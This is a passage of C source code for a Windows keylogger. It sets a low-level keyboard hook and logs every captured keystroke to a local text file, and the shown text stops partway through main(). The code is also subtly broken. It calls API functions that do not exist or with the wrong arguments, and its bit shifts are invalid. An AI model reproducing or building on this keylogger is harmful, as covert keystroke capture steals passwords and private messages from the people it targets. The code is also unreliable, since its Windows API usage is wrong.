```c
#include <Windows.h>
#include <stdio.h>
#include <ctime>

#define FILE_NAME "keystrokes.txt"
#define SLEEP_TIME 100  // milliseconds to prevent high CPU usage

static HHOOK hook;
static FILE *file;
static DWORD lastKeyState = 0;

// Function to handle key presses
void HandleKeyPress(int key, int state) {
    if ((lastKeyState & state) != lastKeyState) {
        char c = (key == 0x1 ? ' ' : 0);
        if (state & (1 << 32)) {
            c = 0;
        }
        if (c != 0) {
            // Handle special characters and modifiers
            if (key == 0x08) c = '\b';
            if (key == 0x1C) c = '\r';
            if (key == 0x1B) c = '\0';

            // Handle Shift, Ctrl, Alt for Unicode characters
            if ((state & (1 << 32)) && (key != 0x10)) {
                // Use GetAsyncKeyState for Unicode characters
                char unicode_char;
                if (GetAsyncKeyState(0x10, &unicode_char) == 0) {
                    c = (char)unicode_char;
                }
            }

            if (file) {
                fputc(c, file);
                fflush(file);
            }
        }
        lastKeyState = state;
    }
}

// Function to remove the hook
void RemoveHook() {
    if (hook) {
        UnhookKeyboard(hook);
        if (file) {
            fclose(file);
            file = NULL;
        }
    }
}

// Main function
int main() {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    HWND hwnd = GetForegroundWindow();

    hook = SetWindowsHook(WH_KEYBOARD_LL, HandleKeyPress);

    if (!hook) {
        printf("Failed to install keyboard hook\n");
        exit(1);
    }

